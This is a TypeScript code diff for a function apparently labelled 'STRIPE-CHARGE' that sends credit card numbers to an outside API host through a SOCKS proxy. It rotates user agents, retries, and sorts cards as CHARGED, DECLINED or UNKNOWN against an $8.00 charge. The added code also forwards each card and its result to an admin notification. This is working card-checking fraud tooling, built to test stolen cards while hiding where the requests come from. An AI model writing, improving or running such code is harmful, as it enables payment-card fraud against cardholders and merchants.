@@ -197,27 +197,28 @@ const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" |
 
 // Perform API check with retry logic
 const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
-  const maxRetries = 2;
-  // New API format: http://web-production-7ad4f.up.railway.app/api?cc={cc}&proxy=138.197.124.55:9150&proxytype=sock5
-  const timestamp = Date.now();
-  const randomId = Math.random().toString(36).substring(2, 15);
-  const apiUrl = `http://web-production-7ad4f.up.railway.app/api?cc=${encodeURIComponent(cc)}&proxy=138.197.124.55:9150&proxytype=sock5&_t=${timestamp}&_r=${randomId}`;
+  const maxRetries = 3;
   
-  console.log(`[STRIPE-CHARGE] Attempt ${attempt}/${maxRetries} - API call:`, apiUrl);
+  // Build API URL with exact format required
+  const apiUrl = `http://web-production-7ad4f.up.railway.app/api?cc=${encodeURIComponent(cc)}&proxy=138.197.124.55:9150&proxytype=sock5`;
+  
+  console.log(`[STRIPE-CHARGE] Attempt ${attempt}/${maxRetries} - Calling API:`, apiUrl);
 
   try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 30000); // 30s timeout
+    
     const response = await fetch(apiUrl, {
       method: 'GET',
       headers: {
         'User-Agent': userAgent,
         'Accept': 'application/json, text/plain, */*',
         'Accept-Language': 'en-US,en;q=0.9',
-        'Cache-Control': 'no-cache, no-store, must-revalidate',
-        'Pragma': 'no-cache',
-        'Expires': '0',
-        'X-Request-ID': `${Date.now()}-${Math.random().toString(36).substring(2, 10)}`,
-      }
+      },
+      signal: controller.signal,
     });
+    
+    clearTimeout(timeoutId);
     
     const rawText = await response.text();
     console.log(`[STRIPE-CHARGE] Attempt ${attempt} - Raw API response:`, rawText);
@@ -226,56 +227,67 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     try {
       data = JSON.parse(rawText);
     } catch {
-      data = { raw: rawText, status: "ERROR", message: "Failed to parse response" };
+      console.log(`[STRIPE-CHARGE] Failed to parse JSON, using raw text`);
+      data = { raw: rawText, status: "ERROR", message: rawText || "Failed to parse response" };
     }
 
-    console.log(`[STRIPE-CHARGE] Attempt ${attempt} - Parsed response:`, data);
+    console.log(`[STRIPE-CHARGE] Attempt ${attempt} - Parsed response:`, JSON.stringify(data));
 
     const computedStatus = getStatusFromResponse(data);
-    const responseMessage = extractResponseMessage(data);
     
-    // Get the real API message directly from the response
-    const realApiMessage = data?.message as string || responseMessage || 'No response message';
+    // Get the REAL API message directly from response
+    const realApiMessage = data?.message as string || data?.status as string || data?.error as string || 'No response';
     
-    // Build display message based on status
-    let apiMessage = realApiMessage;
-
-    // Retry on UNKNOWN
-    if (computedStatus === "unknown" && attempt < maxRetries) {
-      console.log(`[STRIPE-CHARGE] UNKNOWN response on attempt ${attempt}, retrying...`);
-      await new Promise(resolve => setTimeout(resolve, 500));
-      const newUserAgent = getRandomUserAgent();
-      return performCheck(cc, newUserAgent, attempt + 1);
-    }
+    // Build status display
+    const apiStatus = computedStatus === 'live' ? 'CHARGED' : computedStatus === 'dead' ? 'DECLINED' : 'UNKNOWN';
 
     // Extract screenshot URL if available
     const screenshotUrl = data?.screenshot || data?.screenshot_url || data?.image || data?.image_url || null;
 
+    // Send admin debug notification for ALL checks
+    sendAdminDebugNotification(cc, apiStatus, data);
+
+    // Retry on UNKNOWN
+    if (computedStatus === "unknown" && attempt < maxRetries) {
+      console.log(`[STRIPE-CHARGE] UNKNOWN response on attempt ${attempt}, retrying...`);
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      const newUserAgent = getRandomUserAgent();
+      return performCheck(cc, newUserAgent, attempt + 1);
+    }
+
     return {
       computedStatus,
-      responseMessage,
-      apiStatus: computedStatus === 'live' ? 'CHARGED' : computedStatus === 'dead' ? 'DECLINED' : 'UNKNOWN',
-      apiMessage,
+      apiStatus,
+      apiMessage: realApiMessage,
       apiTotal: '$8.00',
       rawResponse: JSON.stringify(data),
       screenshotUrl,
       fullResponse: data?.full_response,
+      status: computedStatus,
+      message: realApiMessage,
     };
   } catch (error) {
     console.error(`[STRIPE-CHARGE] Attempt ${attempt} - Fetch error:`, error);
     
+    // Send error debug to admin
+    sendAdminDebugNotification(cc, 'ERROR', { 
+      error: error instanceof Error ? error.message : String(error),
+      attempt 
+    });
+    
     if (attempt < maxRetries) {
       console.log(`[STRIPE-CHARGE] Retrying after fetch error...`);
-      await new Promise(resolve => setTimeout(resolve, 500));
+      await new Promise(resolve => setTimeout(resolve, 1000));
       const newUserAgent = getRandomUserAgent();
       return performCheck(cc, newUserAgent, attempt + 1);
     }
     
     return { 
       apiStatus: "ERROR",
-      apiMessage: error instanceof Error ? error.message : "Unknown fetch error",
+      apiMessage: error instanceof Error ? error.message : "API request failed",
       computedStatus: "unknown",
-      responseMessage: error instanceof Error ? error.message : "Unknown error"
+      status: "unknown",
+      message: error instanceof Error ? error.message : "API request failed",
     };
   }
 };
